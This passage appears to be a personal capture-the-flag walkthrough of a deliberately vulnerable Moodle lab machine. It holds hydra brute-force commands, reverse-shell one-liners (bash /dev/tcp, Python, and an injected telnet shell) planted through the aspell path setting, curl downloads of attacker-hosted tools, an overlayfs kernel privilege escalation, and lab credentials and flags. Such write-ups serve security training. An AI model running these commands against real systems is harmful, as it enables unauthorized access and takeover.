                <div class="breadcrumb"><span class="accesshide">Page path</span><ul><li><a title="Home" href="http://severnaya-station.com/gnocertdir/">Home</a></li><li> <span class="accesshide " ><span class="arrow_text">/</span>&nbsp;</span><span class="arrow sep">&#x25BA;</span> <span tabindex="0">Login to the site</span></li></ul></div>
                <div class="navbutton"> </div>
            </div>
            </div>
<!-- END OF HEADER -->

    <div id="page-content">
        <div id="region-main-box">
            <div id="region-post-box">

                <div id="region-main-wrap">
                    <div id="region-main">
                        <div class="region-content">
                            <span id="maincontent"></span><div class="loginbox clearfix onecolumn">
  <div class="loginpanel">
    <h2>Returning to this web site?</h2>
      <div class="subcontent loginsub">
        <div class="desc">
          Login here using your username and password<br/>(Cookies must be enabled in your browser)<span class="helplink"><a href="http://severnaya-station.com/gnocertdir/help.php?component=moodle&amp;identifier=cookiesenabled&amp;lang=en" title="Help with Cookies must be enabled in your browser" id="helpicon68849a943fa9c1"><img src="http://severnaya-station.com/gnocertdir/theme/image.php?theme=standard&amp;image=help&amp;rev=281" alt="Help with Cookies must be enabled in your browser" class="iconhelp" /></a></span>        </div>
        <div class="loginerrors"><span class="error">Invalid login, please try again</span></div>        <form action="http://severnaya-station.com/gnocertdir/login/index.php" method="post" id="login"  >
          <div class="loginform">
            <div class="form-label"><label for="username">Username</label></div>
            <div class="form-input">
              <input type="text" name="username" id="username" size="15" value="doak" />
            </div>
            <div class="clearer"><!-- --></div>
            <div class="form-label"><label for="password">Password</label></div>
            <div class="form-input">
              <input type="password" name="password" id="password" size="15" value=""  />
              <input type="submit" id="loginbtn" value="Login" />
            </div>
          </div>
            <div class="clearer"><!-- --></div>
                            <div class="rememberpass">
                  <input type="checkbox" name="rememberusername" id="rememberusername" value="1" checked="checked" />
                  <label for="rememberusername">Remember username</label>
              </div>
                        <div class="clearer"><!-- --></div>
          <div class="forgetpass"><a href="forgot_password.php">Forgotten your username or password?</a></div>
        </form>
      </div>

      <div class="subcontent guestsub">
        <div class="desc">
          Some courses may allow guest access        </div>
        <form action="index.php" method="post" id="guestlogin">
          <div class="guestform">
            <input type="hidden" name="username" value="guest" />
            <input type="hidden" name="password" value="guest" />
            <input type="submit" value="Login as a guest" />
          </div>
        </form>
      </div>
     </div>
</div>
                        </div>
                    </div>
                </div>

                
                            </div>
        </div>
    </div>

<!-- START OF FOOTER -->
        <div id="page-footer" class="clearfix">
        <p class="helplink"></p>
        <div class="logininfo">You are not logged in.</div><div class="homelink"><a href="http://severnaya-station.com/gnocertdir/">Home</a></div>    </div>
    </div>
<script type="text/javascript" src="http://severnaya-station.com/gnocertdir/theme/javascript.php?theme=standard&amp;rev=281&amp;type=footer"></script>
<script type="text/javascript">
//<![CDATA[
M.str = {"repository":{"add":"Add","back":"&laquo; Back","close":"Close","cleancache":"Clean my cache files","copying":"Copying","date":"Date","downloadsucc":"The file has been downloaded successfully","emptylist":"Empty list","error":"An unknown error occurred!","federatedsearch":"Federated search","filenotnull":"You must select a file to upload.","getfile":"Select this file","iconview":"View as icons","invalidjson":"Invalid JSON string","linkexternal":"Link external","listview":"View as list","loading":"Loading...","login":"Login","logout":"Logout","noenter":"Nothing entered","noresult":"No search result","manageurl":"Manage","popup":"Click \"Login\" button to login","preview":"Preview","refresh":"Refresh","save":"Save","saveas":"Save as","saved":"Saved","saving":"Saving","search":"Search","searching":"Search in","size":"Size","submit":"Submit","sync":"Sync","title":"Choose a file...","upload":"Upload this file","uploading":"Uploading...","xhtmlerror":"You are probably using XHTML strict header, some YUI Component doesn't work in this mode, please turn it off in moodle","chooselicense":"Choose license","author":"Author","norepositoriesavailable":"Sorry, none of your current repositories can return files in the required format.","norepositoriesexternalavailable":"Sorry, none of your current repositories can return external files.","nofilesattached":"No files attached","filepicker":"File picker","nofilesavailable":"No files available","overwrite":"Overwrite","renameto":"Rename to","fileexists":"File name already being used, please use another name","fileexistsdialogheader":"File exists","fileexistsdialog_editor":"A file with that name has already been attached to the text you are editing.","fileexistsdialog_filemanager":"A file with that name has already been attached"},"moodle":{"cancel":"Cancel","help":"Help","next":"Next","ok":"OK","error":"Error","info":"Information","yes":"Yes"},"block":{"addtodock":"Move this to the dock","undockitem":"Undock this item","undockall":"Undock all"},"langconfig":{"thisdirectionvertical":"btt"},"admin":{"confirmation":"Confirmation"}};
//]]>
</script>
<script type="text/javascript">
//<![CDATA[
YUI(M.yui.loader).use('node', function(Y) {
M.util.load_flowplayer();
setTimeout("fix_column_widths()", 20);
M.util.help_icon.add(Y, {"id":"helpicon68849a943fa9c1","url":"http:\/\/severnaya-station.com\/gnocertdir\/help.php?component=moodle&identifier=cookiesenabled&lang=en"});

});
//]]>
</script>
</body>
</html>
[NOTE]
Username parameter name: username
Password parameter name: password
Additional paremeter: rememberusername
Even wrong login attempts return 200
Length of doak wrong login request: 46
Length of doak wrong login reply: 22795
Cookies: MOODLEID1_ and MoodleSession
Wrong login error message: Invalid login, please try again


[ACTION: hydra bruteforce doak login]
hydra -l doak -P /path/to/wordlist.txt   severnaya-station.com http-post-form   "/gnocertdir/login/index.php:username=^USER^&password=^PASS^&rememberusername=1:Invalid login, please try again"   -V -t 4 -w 10 -f -o hydra_results.txt
[NOTE]
After running for 3000 attempts, it found no valid login.


[INFO: xenia right login request]
POST /gnocertdir/login/index.php HTTP/1.1
Host: severnaya-station.com
Content-Length: 56
Cache-Control: max-age=0
Origin: http://severnaya-station.com
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://severnaya-station.com/gnocertdir/login/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: MOODLEID1_=%25CA%2525%25CB%2513%25B0; MoodleSession=thug8dnn16p7uknkmte3bdgbj6
Connection: keep-alive

username=xenia&password=RCP90rulez%21&rememberusername=1


[INFO: xenia right login reply]
HTTP/1.1 303 See Other
Date: Sat, 26 Jul 2025 09:24:43 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.24
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Set-Cookie: MoodleSession=97jlshe4aleujfjg1r8cbvioc4; path=/gnocertdir/
Set-Cookie: MOODLEID1_=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/gnocertdir/
Set-Cookie: MOODLEID1_=%25CA%2525%25CB%2513%25B0; expires=Wed, 24-Sep-2025 09:24:43 GMT; Max-Age=5184000; path=/gnocertdir/
Location: http://severnaya-station.com/gnocertdir/login/index.php?testsession=6
Content-Language: en
Content-Length: 598
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"  lang="en" xml:lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<title>Redirect</title>
</head><body><div style="margin-top: 3em; margin-left:auto; margin-right:auto; text-align:center;">This page should automatically redirect. If nothing is happening please use the continue link below.<br /><a href="http://severnaya-station.com/gnocertdir/login/index.php?testsession=6">Continue</a></div></body></html>
[NOTE]
Valid login content-length reply: 598
Wrong login content-length reply: 22795



[NOTE]
Instead of creating a more complex hydra bruteforce attempt, we will try to bruteforce doak's pop3 login.
[ACTION: bruteforce doak pop3 login]
hydra -l doak -P /usr/share/wordlists/fasttrack.txt -s 55007 10.10.77.114 pop3
[OUTPUT]
[55007][pop3] host: 10.10.77.114   login: doak   password: goat
[ANSWER]
goat



[3.6. USE THIS USERS CREDENTIALS TO GO THROUGH ALL THE SERVICES YOU HAVE FOUND TO REVEAL MORE EMAILS]
[ACTION: doak login to pop3 on port 55007]
telnet 10.10.77.114
USER doak
PASS goat


[ACTION: list messages]
LIST
[OUTPUT]
1 606


[ACTION: read the only message]
RETR 1
Return-Path: <doak@ubuntu>
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id 97DC24549D
	for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
Message-Id: <20180425034731.97DC24549D@ubuntu>
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!



[3.7. WHAT IS THE NEXT USER YOU CAN FIND FROM DOAK?]
[ANSWER]
dr_doak



[3.8. WHAT IS THE USERS PASSWORD?]
4England!



[3.9. TAKE A LOOK AT THEIR FILES ON THE MOODLE (severnaya-station.com)]
[ACTION: log in as dr_doak (in: http://severnaya-station.com/gnocertdir/login/index.php)]
Use dr_doak|4England!


[ACTION: browse their files]
We go to My profile > My private files, redirecting to: http://severnaya-station.com/gnocertdir/user/files.php
[OUTPUT]
for james


[ACTION: explore for james folder]
We find file s3cret.txt
When clicked, it downloads to our machine.


[ACTION: read the secret]
cat s3cret.txt
[OUTPUT]
007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.


[3.10. DOWNLOAD THE ATTACHMENTS AND SEE IF THERE ARE ANY HIDDEN MESSAGES INSIDE THEM?]
[NOTE]
We already did. Looks like we need to investigate .../dir007key/for-007.jpg.
[ACTION: visit http://severnaya-station.com/dir007key/for-007.jpg]
The image displayed doesn't show any clear clue.
It is probably using steganography.

[NOTE]
We download the image to our local machine to run some metadata and steganography tools against it.
[ACTION: test exiftool]
exiftool for-007.jpg
[OUTPUT]
xifTool Version Number         : 13.25
File Name                       : for-007.jpg
Directory                       : .
File Size                       : 15 kB
File Modification Date/Time     : 2025:07:26 11:48:21+02:00
File Access Date/Time           : 2025:07:26 11:48:21+02:00
File Inode Change Date/Time     : 2025:07:26 11:48:24+02:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
X Resolution                    : 300
Y Resolution                    : 300
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : eFdpbnRlcjE5OTV4IQ==
Make                            : GoldenEye
Resolution Unit                 : inches
Software                        : linux
Artist                          : For James
Y Cb Cr Positioning             : Centered
Exif Version                    : 0231
Components Configuration        : Y, Cb, Cr, -
User Comment                    : For 007
Flashpix Version                : 0100
Image Width                     : 313
Image Height                    : 212
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 313x212
Megapixels                      : 0.066
[NOTE]
Interesting string from the Image Description field: eFdpbnRlcjE5OTV4IQ==
Looks like base64.


[ACTION: decode eFdpbnRlcjE5OTV4IQ== via https://www.base64decode.org/]
[OUTPUT]
xWinter1995x!
[NOTE]
As the downloaded secret affirms, we know have the creds for admin login to moodle.



[3.11. USING THE INFORMATION YOU FOUND IN THE LAST TASK, LOGIN WITH THE NEWLY FOUND USER]
[ACTION: log in with creds admin|xWinter1995x! to portal http://severnaya-station.com/gnocertdir/login/index.php]


[NOTE]
As the room instructions indicate, we know need to find a way to modify the moodle settings, and then upload a rev shell.
We are also clued to investigate the Aspell plugin.
[ACTION: aspell investigation]
Using the searchbar in the bottom left, we look for aspell.
[OUTPUT]
Search results - System paths

Path to aspell
aspellpath
sh -c '(sleep 4062|telnet 192.168.230.132 4444|while : ; do sh && break; done 2>&1|telnet 192.168.230.132 4444 >/dev/null 2>&1 &)'
✘Default: Empty
To use spell-checking within the editor, you MUST have aspell 0.50 or later installed on your server, and you must specify the correct path to access the aspell binary. On Unix/Linux systems, this path is usually /usr/bin/aspell, but it might be something else.
[NOTE]
There should be a path to the plugin, but it looks like a command injection has already been done.


[ACTION: start listener]
nc -lnvp 4444


[NOTE]
We will modify the aspell path to our own reverse shell spawn: sh -c 'bash -i >& /dev/tcp/10.23.25.109/4444 0>&1'
[ACTION: spawn rev shell]
Delete current injection and type in ours (sh -c 'bash -i >& /dev/tcp/10.23.25.109/4444 0>&1').
Then hit save changes.
[NOTE]
We caught no shell.


[NOTE]
After some investigation, our injection was done fine.
But we need to run the spell checker, for the command to actually run.
For that, we need a site to run the checker on.

[ACTION: create blog entry]
Visit: Site pages > Site blogs.
Add a new entry.
Fill in required fields.
Select some text on the Blog entry body field.
Click toggle spell checker button.
[NOTE]
The blog editor hanged, but we didn't catch any shell. This means our one liner failed.


[ACTION: retry spawn shell]
New one liner: python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.23.25.109”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
[NOTE]
We still didn't catch a shell after running spellchecker.


[NOTE]
After reading writeup, I realized I was missing a step.
[ACTION: change spell engine]
Search spell engine using the search bar (http://severnaya-station.com/gnocertdir/admin/search.php?query=spell+engine).
Make the change: Google Spell -> PSpellShell
Save changes.


[ACTION: spawn shell (third try)]
Again, same process of editing a blog and running spell check.
[NOTE]
Now spellchecker returns No misspellings found.
(?)


[NOTE]
I restarted the machine. New ip: 10.10.99.127.
Updated hosts file.
[ACTION: spawn sell (fourth try...)]
[OUTPUT]
$




[>>> TASK 4: PRIVILEGE ESCALATION]
[ACTION: download linuxprivchecker.py from https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123]


[ACTION: get file to machine]
Attacker: python3 -m http.server 8000
Machine: curl http://10.23.25.109:8000/linuxprivchecker.py -o linuxprivchecker.py

[ACTION: set TERM (to run clear)]
export TERM=xterm


[ACTION: run linuxprivchecker]
python linuxprivchecker.py



[4.1. ENUMERATE THE MACHINE MANUALLY]
Nothing to do here.



[4.2. WHATS THE KERNEL VERSION?]
[ACTION: display kernel version]
uname -r
[OUTPUT]
3.13.0-32-generic
[ANSWER]
3.13.0-32-generic



[4.3. YOU CAN DOWNLOAD THE EXPOIT FROM HERE: https://www.exploit-db.com/exploits/37292]
[Note]
Saved it as overlayfs_exploit.c



[4.4. FIX THE EXPLOIT TO WORK WITH THE SYSTEM YOU'RE TRYING TO EXPLOIT. REMEMBER, ENUMERATION IS YOUR KEY!. WHAT DEVELOMPENT TOOLS ARE INSTALLED IN THE MACHINE?]
[ACTION: check installed compilers on machine]
which gcc g++ cc c++ make cmake
[OUTPUT]
/usr/bin/cc
/usr/bin/c++


[NOTE]
The exploit scripts compiles with gcc, but the machine only has cc. 
We need to update that line: lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
After removing the g, the exploit should work as expected.
[ACTION: remove g from gcc in line 32]


[ACTION: send overlayfs_exploit.c to target]
On attacker: python3 -m http.server 8000
On machine: curl http://10.23.25.109:8000/overlayfs_exploit.c -o overlayfs_exploit.c


[ACTION: compile and run exploit]
cc overlayfs_exploit.c -o overlayfs_exploit
./overlayfs_exploit
[OUTPUT]
#



[4.5. WHAT IS THE ROOT FLAG?]
[ACTION: check the root flag]
cat /root/root.txt
[OUTPUT]
cat: /root/root.txt: No such file or directory


[ACTION: move into root and list all files]
cd /root; ls -la
[OUTPUT]
drwx------  3 root root 4096 Apr 29  2018 .
drwxr-xr-x 22 root root 4096 Apr 24  2018 ..
-rw-r--r--  1 root root   19 May  3  2018 .bash_history
-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
drwx------  2 root root 4096 Apr 28  2018 .cache
-rw-------  1 root root  144 Apr 29  2018 .flag.txt
-rw-r--r--  1 root root  140 Feb 19  2014 .profile
-rw-------  1 root root 1024 Apr 23  2018 .rnd
-rw-------  1 root root 8296 Apr 29  2018 .viminfo


[ACTION: check root flag]
cat .flag.txt
[OUTPUT]
Alec told me to place the codes here: 

568628e0d993b1973adc718237da6e93

If you captured this make sure to go here.....
/006-final/xvf7-flag/
[ANSWER]
568628e0d993b1973adc718237da6e93

